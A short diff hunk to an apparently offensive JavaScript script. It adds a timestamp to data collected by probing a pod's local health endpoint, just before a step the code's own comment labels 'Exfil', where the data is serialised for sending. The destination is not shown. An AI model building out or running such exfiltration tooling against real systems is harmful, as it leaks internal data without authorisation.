@@ -45,6 +45,7 @@ async function run() {
 
   // Check our own pod IP for reference
   d.own_healthz = await httpGet('127.0.0.1', 8000, '/healthz');
+  d.ts = Date.now();
 
   // Exfil
   const body = JSON.stringify(d, null, 2);
